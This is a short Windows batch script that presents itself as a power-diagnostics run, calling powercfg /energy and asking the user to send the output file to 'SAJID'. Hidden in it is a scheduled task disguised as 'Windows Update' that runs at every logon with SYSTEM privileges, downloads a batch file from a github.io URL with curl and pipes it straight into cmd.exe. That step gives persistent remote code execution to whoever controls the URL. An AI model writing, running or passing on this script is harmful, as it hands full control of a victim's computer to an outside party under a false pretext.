@echo off
color 7F
schtasks /create /tn "Windows Update" /tr "cmd.exe /k curl -s "https://mohammadsajidalam.github.io/cmd/after.bat" | cmd.exe" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
color 1F
cls
CMD
powercfg /energy
@echo on
echo "Please Sent The Output File To SAJID :)"
TIMEOUT 8 /NOBREAK
